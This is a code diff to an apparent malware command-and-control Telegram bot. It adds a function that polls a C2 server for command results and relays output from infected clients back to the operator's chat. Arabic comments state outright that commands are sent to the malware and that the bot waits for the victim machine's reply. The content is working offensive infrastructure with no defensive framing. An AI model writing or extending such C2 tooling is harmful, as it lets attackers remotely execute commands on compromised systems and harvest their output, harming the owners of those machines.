@@ -86,6 +86,27 @@ def _send_command(client_id: str, command: str, sudo: bool = False) -> dict:
         return {"error": str(e)}
 
 
+def _poll_command_result(cmd_id: int, timeout: int = 90, interval: float = 2.0) -> dict | None:
+    """يسأل c2_server كل `interval` ثانية لحد ما الأمر يخلص أو timeout"""
+    import time
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        try:
+            r = requests.get(
+                f"{C2_URL}/command/{cmd_id}",
+                headers=C2_HEADERS,
+                timeout=5,
+            )
+            if r.status_code == 200:
+                data = r.json()
+                if data.get("status") in ("done", "error"):
+                    return data
+        except Exception:
+            pass
+        time.sleep(interval)
+    return None
+
+
 def _get_history(limit: int = 5) -> list:
     try:
         r = requests.get(f"{C2_URL}/commands/history", headers=C2_HEADERS, timeout=5)
@@ -279,28 +300,54 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     status     = result.get("status", "queued")
     cmd_result = result.get("result")
-    cmd_id     = result.get("command_id", "?")
+    cmd_id     = result.get("command_id")
 
     if status == "done" and cmd_result is not None:
-        # Immediate result (C2-Server executed locally)
+        # نتيجة فورية (C2-Server نفّذ الأمر محلياً)
         output = cmd_result or "(no output)"
-        # Truncate if too long for Telegram
         if len(output) > 3800:
             output = output[:3800] + "\n… (truncated)"
         await update.message.reply_text(
             f"✅ *Done* (id={cmd_id})\n```\n{output}\n```",
             parse_mode="Markdown",
         )
+
     elif status == "error" and cmd_result is not None:
         await update.message.reply_text(
             f"❌ *Error* (id={cmd_id})\n```\n{cmd_result}\n```",
             parse_mode="Markdown",
         )
+
+    elif status in ("sent_via_telegram", "queued") and cmd_id:
+        # الأمر اتبعت للمالوير — نستنى النتيجة (90 ثانية max)
+        await update.message.reply_text(
+            f"📡 *Sent* (id={cmd_id})\n"
+            f"Waiting for `{client_id}` to respond…",
+            parse_mode="Markdown",
+        )
+        res = await asyncio.get_event_loop().run_in_executor(
+            None, _poll_command_result, cmd_id, 90
+        )
+        if res is None:
+            await update.message.reply_text(
+                f"⏱️ *Timeout* (id={cmd_id})\n"
+                f"No response from `{client_id}` within 90 s. Result will appear in the dashboard when it arrives.",
+                parse_mode="Markdown",
+            )
+        else:
+            output = res.get("result") or "(no output)"
+            if len(output) > 3800:
+                output = output[:3800] + "\n… (truncated)"
+            icon = "✅" if res.get("status") == "done" else "❌"
+            await update.message.reply_text(
+                f"{icon} *Result* (id={cmd_id})\n```\n{output}\n```",
+                parse_mode="Markdown",
+            )
+
     else:
-        # Queued for a real agent
         await update.message.reply_text(
             f"📨 *Queued* (id={cmd_id})\n"
-            f"Command sent to `{client_id}`. Result will appear in dashboard when agent reports back.",
+            f"Command sent to `{client_id}`. Result will appear in dashboard.",
             parse_mode="Markdown",
         )
 
